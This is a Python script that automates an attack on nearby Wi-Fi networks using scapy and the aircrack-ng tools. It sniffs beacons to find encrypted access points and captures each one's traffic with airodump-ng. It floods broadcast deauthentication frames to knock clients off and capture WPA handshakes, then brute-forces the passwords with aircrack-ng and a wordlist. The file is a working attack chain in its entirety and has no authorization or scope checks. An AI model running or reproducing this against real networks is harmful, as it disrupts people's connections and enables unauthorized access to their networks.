import os
import subprocess
import signal
from scapy.all import *

ap_info = {}
folder = os.path.join("..", "data", "ressources", "wifi")

def monitor_mode(iface_name):
    os.system(f"sudo ifconfig {iface_name} down")
    os.system(f"sudo iwconfig {iface_name} mode monitor")
    os.system(f"sudo ifconfig {iface_name} up")

def send_deauth(bssid, iface):
    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
    sendp(pkt, iface=iface, count=300, inter=.1)

def start_capture(bssid, channel, iface):
    process = subprocess.Popen(["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", f"{folder}/capture", iface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    return process

def stop_capture(process):
    if process:
        process.send_signal(signal.SIGINT)  # Send CTRL+C signal to airodump-ng process
        time.sleep(2)  # Allow some time for airodump-ng to properly close

def crack_handshake(file, wordlist):
    result = subprocess.run(["sudo", "aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    output = result.stdout
    if "KEY FOUND!" in output:
        return True
    else:
        return False

def check_handshake(filename):
    result = subprocess.run(["sudo", "aircrack-ng", filename], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    return "1 handshake" in result.stdout

def PacketHandler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            ssid = pkt.info
            bssid = pkt.addr2
            channel = int(ord(pkt[Dot11Elt:3].info))

            # Check the encryption type
            crypto = "Open"
            if pkt.haslayer(Dot11Elt):
                p = pkt[Dot11Elt]
                while isinstance(p, Dot11Elt):
                    if p.ID == 48:
                        crypto = "WPA2"
                    elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                        crypto = "WPA"
                    p = p.payload

            if ssid not in ap_info:
                ap_info[ssid] = {'BSSID': bssid, 'channel': channel, 'password_cracked': False, 'crypto': crypto}

def start_wifi(iface_name="wlan1"):
    monitor_mode(iface_name)
    sniff(iface=iface_name, prn=PacketHandler, timeout=30)
    results = []
    for ssid in ap_info:
        if ap_info[ssid]['crypto'] != "Open":
            capture_process = start_capture(ap_info[ssid]['BSSID'], ap_info[ssid]['channel'], iface_name)
            time.sleep(2)  # Wait for airodump-ng to start
            send_deauth(ap_info[ssid]['BSSID'], iface_name)
            stop_capture(capture_process)

            if check_handshake(f"{folder}/capture-01.cap"):
                print("Handshake found, start cracking...")
                result = crack_handshake(f"{folder}/capture-01.cap", f"{folder}/passwords.txt")
                if result:
                    ap_info[ssid]['password_cracked'] = True
                else:
                    ap_info[ssid]['password_cracked'] = False
        else:
            ap_info[ssid]['password_cracked'] = True
        ap_result = {'SSID': ssid, 'crypto': ap_info[ssid]['crypto'], 'password_cracked': ap_info[ssid]['password_cracked']}
        results.append(ap_result)

    os.system(f"sudo airmon-ng stop {iface_name}")
    os.system(f"sudo ifconfig {iface_name} up")
    return results

